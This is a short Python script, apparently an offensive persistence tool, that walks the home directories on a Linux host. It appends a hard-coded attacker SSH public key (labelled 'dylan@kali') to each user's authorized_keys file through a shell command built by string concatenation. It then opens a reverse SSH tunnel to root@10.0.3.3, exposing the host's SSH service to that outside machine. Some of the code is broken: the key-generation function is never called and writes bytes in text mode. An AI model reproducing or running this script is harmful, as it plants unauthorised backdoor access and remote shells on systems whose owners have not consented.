#!/usr/bin/env python3
import subprocess
import os
from Crypto.PublicKey import RSA  # For generating public and private SSH keys


# REMOTE host info
remote_host = "root@10.0.3.3"
remote_pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcJvs1RgWGEFD5MPLRG3N3l0Y0CizlA1cV/Qymp269ms+UOXqjLtHE+THajBcvM/43imvJCYHxaBMg1CnWzIjckuryfd7StDYR0Ae1nU41IkkdmhDKMs3HWPNBKknMBRMh+fVbVBxM0NeYP2SbqcBP6qJvZvE/LCC3CnHBQqBQlCARNyL0ttV3vrDpRUimOgnjrUhjOWm3L/IQ6gJJX1Ej3Xx94YDgZHpe8ER/6Va1rMcd5LdeloR6nMg0ir7IT308+1uU3KsM1r0PbmMv9ltGiPQ/tjb1YQFp8PF6pQQqi1MIsaIdhcN62FNSBG4YWx2PqiyWZazCx7jOJ6/pIJoj dylan@kali"


def generate_keys():
    """Generate public and private RSA keys"""

    key = RSA.generate(4096)
    with open("private.key", "w") as f:
        os.chmod("private.key", 0o600)
        f.write(key.exportKey("PEM"))
    pubkey = key.publickey()
    with open("public.key", "w") as f:
        f.write(pubkey.exportKey("OpenSSH"))


# Check if host has an ssh client installed
if subprocess.check_output(["which", "ssh"]):
    print("SSH exists")
else:
    print("Host doesn't have an ssh client")
    exit(1)

# List every user with a home directory
for user in os.listdir("/home/"):
    print("User found: {}".format(user))

    # Check if user has a .ssh directory
    if os.path.exists("/home/"+user+"/.ssh/"):
        print("{} has a .ssh directory".format(user))

        # Check if user has an authorized_keys file
        if os.path.exists("/home/"+user+"/.ssh/authorized_keys"):
            print("{} has an authorized_keys file".format(user))

            # Check if remote_pubkey already exists in authorized_keys
            with open("/home/"+user+"/.ssh/authorized_keys", "r") as f:
                if remote_pubkey in f.read():
                    print("Key already exists in host's authorized keys")
                else:
                    print("Adding pubkey to {}s authorized_keys file".format(user))
                    subprocess.run("echo "+remote_pubkey+" >> /home/"+user+"/.ssh/authorized_keys", shell=True)

            # Initiate reverse tunnel to host
            print("Starting SSH tunnel")
            ssh = subprocess.run(["ssh", "-TN", "-i", "private.key", "-R", "2222:localhost:22", remote_host])  # -fTN #
    else:
        continue
